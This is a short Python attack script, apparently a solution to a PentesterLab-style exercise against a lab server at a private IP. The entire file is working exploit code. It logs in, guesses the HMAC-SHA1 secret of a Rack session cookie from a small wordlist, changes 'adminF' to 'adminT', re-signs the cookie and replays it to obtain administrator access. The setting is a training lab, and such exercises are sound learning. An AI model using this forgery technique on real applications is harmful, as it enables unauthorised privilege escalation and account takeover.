import requests
import base64
import hmac
from urllib.parse import unquote_to_bytes, quote
from hashlib import sha1

def get_new_cookie(cookie, signature):    
    secret = get_secret(cookie, signature)
    
    cookie = base64.b64decode(cookie).decode('utf-8')
    new_cookie = cookie.replace('adminF', 'adminT')
    new_cookie = new_cookie.encode('utf-8')
    new_cookie = base64.b64encode(new_cookie)    
    
    new_signature = get_new_signature(new_cookie, secret)
    
    return quote(new_cookie)+"--"+new_signature

#Возвращает secret, используемый для подписи cookie
def get_secret(cookie, signature):
    finding_secret = ''    
    secret_variants = {
        'secret',
        'pentesterlab',
        'admin',
        'test',
        'password'
        }
    
    for secret_variant in secret_variants:
        hm = hmac.new(secret_variant.encode(), cookie, sha1)
        hm = hm.hexdigest()        
        if hm == signature:
            finding_secret = secret_variant         
    
    return finding_secret

def get_new_signature(cookie, secret):
    return hmac.new(secret.encode(), cookie, sha1).hexdigest()


#Получили ответ с уязвимого сервера
URL = "http://192.168.0.102/login"
data = 'login=test&password=test'
response = requests.post(URL, data=data, allow_redirects=False)

#Получим cookie и signature из заголовка Set-Cookie
cookie_content = response.headers.get('Set-Cookie')
cookie_content = cookie_content.split("=")[1].split("; ")[0]
cookie, signature = cookie_content.split("--")
cookie = unquote_to_bytes(cookie)

new_cookie = get_new_cookie(cookie, signature)
cookies = {'rack.session': new_cookie}
admin_response = requests.post(URL, data=data, cookies=cookies, allow_redirects=True)